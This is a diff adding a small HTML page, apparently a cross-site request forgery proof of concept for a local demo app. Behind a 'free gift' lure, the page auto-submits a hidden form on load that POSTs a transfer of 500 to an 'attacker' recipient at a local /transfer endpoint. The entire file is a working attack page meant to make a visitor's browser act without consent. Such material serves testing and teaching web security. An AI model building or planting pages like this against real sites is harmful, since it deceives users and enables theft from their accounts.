@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacked</title>
+</head>
+<body onload="document.forms[0].submit();">
+    <h3>Click here for a free gift!</h3>
+
+    <form action="http://127.0.0.1:5000/transfer" method="POST">
+        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+</body>
+</html>
